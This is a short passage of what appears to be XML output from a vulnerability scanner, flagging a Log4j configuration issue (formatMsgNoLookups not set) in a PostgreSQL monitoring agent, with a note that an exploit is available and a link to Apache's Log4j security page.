Application: PostgreSQL Monitoring Agent v3.2.1
formatMsgNoLookups: not set</plugin_output>
        <exploit_available>true</exploit_available>
        <see_also>https://logging.apache.org/log4j/2.x/security.html</see_also>
        <plugin_publication_date>2021/12/10</plugin_publication_date>
